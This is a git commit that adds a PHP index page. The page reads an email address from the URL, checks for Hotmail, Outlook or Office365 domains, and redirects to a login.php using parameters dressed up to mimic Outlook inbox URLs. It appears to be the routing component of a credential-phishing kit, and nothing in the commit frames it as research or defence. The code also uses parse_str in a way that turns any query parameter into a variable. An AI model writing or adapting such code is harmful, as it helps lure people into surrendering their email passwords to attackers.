587e4b76e7d6d794c5ddceb6ae9086b1e46fdbb1
venec2020 <venec55673@jupiterm.com>
2020-05-14 01:02:12 +0100

    sf

---
+++ index.php
@@ -0,0 +1,17 @@
+<?php 
+
+ $url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+ parse_str(parse_url($url, PHP_URL_QUERY));
+ $domain = explode('@', $email);
+ 
+ $domain_check = '@'.strtolower($domain[1]);
+ 
+ if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
+  header('Location: login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.123InboxLight.aspxn.1774256418&fid.1252899645289964213InboxLight_Product-email&email='.$email);
+ }
+ 
+ else {
+  header('Location: login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product-email&email='.$email);
+ }
+  
+?>
